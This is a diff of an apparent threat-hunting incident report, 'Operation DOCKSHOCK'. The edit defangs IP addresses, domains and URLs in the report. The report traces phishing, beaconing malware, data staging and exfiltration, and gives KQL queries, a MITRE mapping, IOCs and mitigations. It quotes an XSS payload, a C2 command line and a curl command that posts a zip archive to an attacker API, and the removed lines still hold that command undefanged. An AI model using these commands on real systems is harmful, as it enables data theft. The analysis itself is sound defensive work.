@@ -79,17 +79,17 @@ InboundNetworkEvents
 | project timestamp, src_ip, user_agent, url, status_code
 ```
 
-{% include figure.html src="/assets/images/posts/operation-dockshock/s-3.png" alt="Web log inbound event from 13.201.46.208 with a 404 error code and Opera/8.64 user-agent string" caption="Figure 3: Perimeter probe from 13.201.46.208 — 404 responses and an anomalous Opera/8.64 user agent." %}
+{% include figure.html src="/assets/images/posts/operation-dockshock/s-3.png" alt="Web log inbound event from 13[.]201[.]46[.]208 with a 404 error code and Opera/8.64 user-agent string" caption="Figure 3: Perimeter probe from 13[.]201[.]46[.]208 — 404 responses and an anomalous Opera/8.64 user agent." %}
 
 *   **Attacker Payload:** `</script><script>alert('xss')</script>`
 *   **WAF Mitigation Status:** Deflected. The web server responded with a 404 Status Code, preventing script execution.
 *   **Attacker User Agent:** Opera/8.64.(X11; Linux x86_64; kok-IN) Presto/2.9.165 Version/10.00
 
-Expanding the search window around this user agent exposed a cluster of **4 malicious IP addresses** (98.117.26.236, 13.201.46.208, 105.78.23.64, 56.6.30.190) executing **9 distinct exploitation requests** across a multi-day window. Passive DNS correlation tied these IPs to a deliberate **twin-typosquatting infrastructure** scheme engineered to mimic authentic industry communications:
+Expanding the search window around this user agent exposed a cluster of **4 malicious IP addresses** (98[.]117[.]26[.]236, 13[.]201[.]46[.]208, 105[.]78[.]23[.]64, 56[.]6[.]30[.]190) executing **9 distinct exploitation requests** across a multi-day window. Passive DNS correlation tied these IPs to a deliberate **twin-typosquatting infrastructure** scheme engineered to mimic authentic industry communications:
 
-*   **eco-awareness-updates.net** *(plural)* ── inbound mail-routing / phishing envelope domain.
-*   **eco-awareness-update.net** *(singular)* ── backend API staging and exfiltration landing zone.
-*   **news-on-industry.com** / **energy-trends4u.net** ── hosted file-delivery relays.
+*   **eco-awareness-updates[.]net** *(plural)* ── inbound mail-routing / phishing envelope domain.
+*   **eco-awareness-update[.]net** *(singular)* ── backend API staging and exfiltration landing zone.
+*   **news-on-industry[.]com** / **energy-trends4u[.]net** ── hosted file-delivery relays.
 
 ### Phase 3: Initial Access via Spear-Phishing
 
@@ -108,9 +108,9 @@ Email
 
 The patient-zero entry vector occurred on **May 1, 2024, at 15:51:41 UTC**. Carla Wharton (cawharton), a Sales Representative on host JUSP-LAPTOP, received a weaponized lure:
 
-*   **Sender:** news@eco-awareness-updates.net (Reply-To: electric_updates@gmail.com)
+*   **Sender:** news[@]eco-awareness-updates[.]net (Reply-To: electric_updates[@]gmail[.]com)
 *   **Subject:** [EXTERNAL] Business Opportunity: Two major energy companies merging
-*   **Lure Link:** [http://news-on-industry.com/search/online/files/public/Energy_Industry_Trends_2024_4_Solvi.docx](http://news-on-industry.com/search/online/files/public/Energy_Industry_Trends_2024_4_Solvi.docx)
+*   **Lure Link:** hxxp://news-on-industry[.]com/search/online/files/public/Energy_Industry_Trends_2024_4_Solvi.docx
 
 At 15:57:41 UTC, endpoint records confirm that the user executed the link, triggering an immediate second-stage binary download via `explorer.exe`:
 
@@ -130,7 +130,7 @@ ProcessEvents
 
 {% include figure.html src="/assets/images/posts/operation-dockshock/s-5.png" alt="Process event log showing the ecobug.exe execution command line with destination and port flags" caption="Figure 5: Process log capturing ecobug.exe execution with C2 destination and port arguments." %}
 
-*   **C2 Command Line:** ecobug.exe --timeout 6000 --dest 98.117.26.236 --port 1337
+*   **C2 Command Line:** ecobug.exe --timeout 6000 --dest 98[.]117[.]26[.]236 --port 1337
 *   **Beaconing Signature:** The malware operated on a strict automated cadence, initiating an outbound connection over TCP Port 1337 exactly 1 time per day at 17:38:25.
 *   **Scope of Compromise:** Expanding the beacon signature across the enterprise revealed 470 total persistent connections impacting 38 unique employee endpoints.
 
@@ -162,9 +162,9 @@ ProcessEvents
 
 {% include figure.html src="/assets/images/posts/operation-dockshock/s-6.png" alt="PowerShell command line copying network assets to a local C drive staging folder" caption="Figure 6: PowerShell staging command copying source assets to a local staging folder." %}
 
-*   **Data Scrape Command:** Copy-Item -Path \\solvisystems.com\SharedDocs\SoftwareDevelopment\CycleDocuments\* -Destination C:\Users\alpetrov\CollectedData\Software_Cycle_Docs
+*   **Data Scrape Command:** Copy-Item -Path \\solvisystems[.]com\SharedDocs\SoftwareDevelopment\CycleDocuments\* -Destination C:\Users\alpetrov\CollectedData\Software_Cycle_Docs
 
-The collected assets were compressed locally into `C:\Users\alpetrov\CollectedData\CollectedData.zip`. To prepare for exfiltration, the actor relocated this staging archive out of the user directory into a localized root path, renaming it to `C:\DataExfil\CollectedData.zip` to streamline programmatic access. Concurrently, the attacker compromised three distinct internal accounts to browse the developer intranet (devportal.solvisystems.com) and read the internal_process.pdf deployment documentation. The adversary even used compromised mailboxes to distribute phishing messages internally under urgent security headings (Urgent Request: DOCKS System Documentation) to gather structural details.
+The collected assets were compressed locally into `C:\Users\alpetrov\CollectedData\CollectedData.zip`. To prepare for exfiltration, the actor relocated this staging archive out of the user directory into a localized root path, renaming it to `C:\DataExfil\CollectedData.zip` to streamline programmatic access. Concurrently, the attacker compromised three distinct internal accounts to browse the developer intranet (devportal[.]solvisystems[.]com) and read the internal_process.pdf deployment documentation. The adversary even used compromised mailboxes to distribute phishing messages internally under urgent security headings (Urgent Request: DOCKS System Documentation) to gather structural details.
 
 On May 28, 2024, the adversary leveraged `curl.exe` — a native utility that ships by default with modern Windows — as a **Living-off-the-Land Binary (LotLBin)** to bypass standard file-transfer protocol tracking, exfiltrating the source blueprint archive directly over an HTTP POST stream:
 
@@ -174,16 +174,16 @@ ProcessEvents
 | where process_commandline contains "curl" and process_commandline contains "upload"
 ```
 
-{% include figure.html src="/assets/images/posts/operation-dockshock/s-7.png" alt="Curl command performing a file POST to api.eco-awareness-update.net" caption="Figure 7: curl exfiltration — file POST to the adversary API node api.eco-awareness-update.net." %}
+{% include figure.html src="/assets/images/posts/operation-dockshock/s-7.png" alt="Curl command performing a file POST to api[.]eco-awareness-update[.]net" caption="Figure 7: curl exfiltration — file POST to the adversary API node api[.]eco-awareness-update[.]net." %}
 
-*   **Exfiltration Command Line:** curl -F 'file=@C:\DataExfil\CollectedData.zip' https://api.eco-awareness-update.net/upload
+*   **Exfiltration Command Line:** curl -F 'file=@C:\DataExfil\CollectedData.zip' hxxps://api[.]eco-awareness-update[.]net/upload
 
 ## 3. MITRE ATT&CK Matrix Mapping
 
 | Tactic | Technique ID | Technique Name | Operational Context |
 |---|---|---|---|
 | Reconnaissance | T1592 | Gather Victim Host Information | Automated web scanning targeting the docks-ics documentation profile. |
-| Initial Access | T1566.002 | Spearphishing Link | Lure distributed via twin typosquat infrastructure (eco-awareness-updates.net). |
+| Initial Access | T1566.002 | Spearphishing Link | Lure distributed via twin typosquat infrastructure (eco-awareness-updates[.]net). |
 | Execution | T1204.002 | User Execution: Malicious File | Recipient interaction launching the weaponized document download stream. |
 | Command & Control | T1571 | Non-Standard Port | Custom beaconing loop established via ecobug.exe over TCP/1337. |
 | Persistence | T1078.003 | Valid Accounts: Local Accounts | Creation of a localized administrative user profile (gu@rd!an). |
@@ -198,11 +198,11 @@ ProcessEvents
 | Type | Indicator | Context / Association |
 |---|---|---|
 | SHA256 Hash | 1c3ef0407d5714037504c52f7abfa86c081fd7a021b52e2abe8a669f92413252 | Malicious payload binary (ecobug.exe) |
-| IP Address | 98.117.26.236 | Primary Command-and-Control (C2) listener destination |
-| IP Address | 13.201.46.208 | Initial Cross-Site Scripting (XSS) reconnaissance node |
-| Domain | eco-awareness-updates.net | Phishing delivery envelope domain (plural typosquat) |
-| Domain | eco-awareness-update.net | Exfiltration API routing target (singular typosquat) |
-| Domain | news-on-industry.com | Malicious weaponized-document hosting relay |
+| IP Address | 98[.]117[.]26[.]236 | Primary Command-and-Control (C2) listener destination |
+| IP Address | 13[.]201[.]46[.]208 | Initial Cross-Site Scripting (XSS) reconnaissance node |
+| Domain | eco-awareness-updates[.]net | Phishing delivery envelope domain (plural typosquat) |
+| Domain | eco-awareness-update[.]net | Exfiltration API routing target (singular typosquat) |
+| Domain | news-on-industry[.]com | Malicious weaponized-document hosting relay |
 | User Profile | gu@rd!an | Backdoor local administrative account profile |
 | User Agent | Opera/8.64.(X11; Linux x86_64; kok-IN) Presto/2.9.165 Version/10.00 | Threat-actor reconnaissance browser footprint |
 
@@ -211,7 +211,7 @@ ProcessEvents
 Based on the multi-layer tactical breakdown of Operation DOCKSHOCK, the following Tier-2 defense architecture changes are mandated for deployment:
 
 1.  **Network Architecture Micro-Segmentation (IT/OT Defenses):**
-    Implement explicit network boundaries isolating the engineering software compilation zone (devportal.solvisystems.com and SharedDocs) from general corporate sales and operations tiers. Inter-zone file transfers must be gated behind multi-factor authorization proxies.
+    Implement explicit network boundaries isolating the engineering software compilation zone (devportal[.]solvisystems[.]com and SharedDocs) from general corporate sales and operations tiers. Inter-zone file transfers must be gated behind multi-factor authorization proxies.
 2.  **Strict Egress Application Whitelisting:**
     Block all outbound perimeter egress over arbitrary high ports (such as TCP/1337). Restrict command-line web automation utilities like curl and Invoke-WebRequest on user endpoints through AppLocker or an equivalent Endpoint Detection and Response (EDR) policy to halt automated exfiltration pipelines.
 3.  **Local Administrator Restriction & Account Creation Monitoring:**
